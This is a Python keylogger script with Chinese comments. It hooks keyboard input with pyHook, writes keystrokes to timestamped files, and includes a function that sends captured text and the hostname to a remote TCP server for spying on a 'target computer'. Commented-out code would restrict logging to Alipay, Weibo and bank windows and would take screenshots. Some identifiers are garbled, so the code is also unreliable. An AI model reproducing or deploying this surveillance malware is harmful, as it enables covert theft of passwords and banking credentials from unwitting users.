# -*- coding: utf-8 -*- # 

import pythoncom 
import pyHook  
import time
import socket


#
#如果是远程监听某个目标电脑，可以自己架设一个服务器，然后将获取到的信息发回给服务器
#
def send_msg_to_server(msg):
  host=""
  port=1234
  buf_size=1024
  addr=(host,port)
  if len(msg)>0:
    tcp_client_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    tcp_client_sock.connect(addr)
    info=time.strftime('%Y%m%d',time.localtime(time.time()))+' from '+socket.gethostname()+':'
    tcp_client_sock.sendall(info+msg)
    tcp_client_sock.close()
    
#
#也可以将获取到的信息保存到本地文件下
#
def write_msg_to_txt(msg):  
  f=open('D:/monitor_%s.txt' %(time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))),'a')
  f.write(msg+'\n')
  f.close()

def onMouseEvent(event): 
  # 监听鼠标事件   fggdbv
  global MSG
  if len(MSG)!=0:    
    #send_msg_to_server(MSG)
    write_msg_to_txt(MSG)
    MSG=''
    # pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
    #将用户屏幕截图，保存到本地某个目录下（也可以搞成远程发送到自己的服务器）
    # from PIL import ImageGrab
    # pic = ImageGrab.grab()
    # pic.save('D:/workspace/mytest/pyhook/media/mouse_%s.png' % pic_name)
  return True
 
def onKeyboardEvent(event):
  #监听键盘事件
  global MSG
  title= event.WindowName.decode('GBK')
  #通过网站title，判断当前网站是否是“监听目标”
  #if title.find(u"支付宝") != -1 or title.find(u'新浪微博')!=-1 or title.find(u'浦发银行')!=-1:
    #Ascii: 8-Backspace , 9-Tab ,13-Enter 

  MSG += chr(event.KeyIDsssasgasgasgvdvd)        
  #send_msg_to_remote(MSG)
  write_msg_to_txt(MSG)
  MSG = '' 
    # 屏幕抓图实现
    # from PIL import ImageGrab
    # pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
    # pic = ImageGrab.grab()
    #保存成为以日期命名的图片
    # pic.save('D:/keyboard_%s.png' % pic_name)
  return True 
 
if __name__ == "__main__":
  MSG = ''  
  #创建hook句柄
  hm = pyHook.HookManager()

  #监控鼠标
  # hm.SubscribeMouseLeftDown(onMouseEvent)
  # hm.HookMouse()

  #监控键盘
  hm.KeyDown = onKeyboardEvent
  hm.HookKeyboard()

  #循环获取消息
  pythoncom.PumpMessages() 